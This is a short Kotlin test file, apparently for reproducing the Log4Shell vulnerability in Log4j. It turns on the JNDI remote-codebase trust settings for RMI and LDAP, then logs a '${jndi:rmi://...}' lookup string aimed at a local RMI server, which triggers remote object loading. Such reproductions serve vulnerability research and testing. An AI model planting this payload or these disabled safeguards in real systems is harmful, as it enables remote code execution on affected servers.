import org.apache.logging.log4j.LogManager

fun main() {
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true")
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true")

    val logger = LogManager.getLogger("BasicTest")
    logger.error("\${jndi:rmi://127.0.0.1:1099/ref/Basic}")
}
